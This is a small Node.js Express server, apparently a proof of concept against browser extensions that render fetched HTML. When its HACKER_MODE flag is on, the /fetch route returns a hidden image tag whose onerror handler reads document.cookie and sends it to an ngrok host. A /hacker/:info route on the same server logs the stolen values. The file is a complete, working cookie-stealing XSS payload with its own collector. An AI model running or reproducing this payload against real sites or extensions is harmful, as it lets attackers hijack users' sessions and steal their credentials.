const express = require('express')
const app = express()
const port = 3001

DEBUG = true
HACKER_MODE = true

app.get('/', (req, res) => {
  res.send('Content provider for your extensions!')
})

app.get('/hacker/:info', (req, res) => {
  console.log("New request to /hacker: " + req.params.info)
})

app.get('/fetch', (req, res) => {
  console.log("New request to /fetch")
  //res.send("I am a <b>bold</b> text!")
  if (HACKER_MODE) {
    if (DEBUG) {
      res.send("<img style='display:none' src='nope' onerror='alert(); const Http = new XMLHttpRequest(); Http.open(\"GET\", \"https://1e5f1a5da9f9.ngrok.io/hacker/\" + document.cookie); Http.send(); alert(\"done with xhr\");'/>");
    } else {
      res.send("<img style='display:none' src='nope' onerror='const Http = new XMLHttpRequest(); Http.open(\"GET\", \"https://1e5f1a5da9f9.ngrok.io/hacker/\" + document.cookie); Http.send();'/>");
    }
  } else {
    res.send("TODO, send back something benign");
  }
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})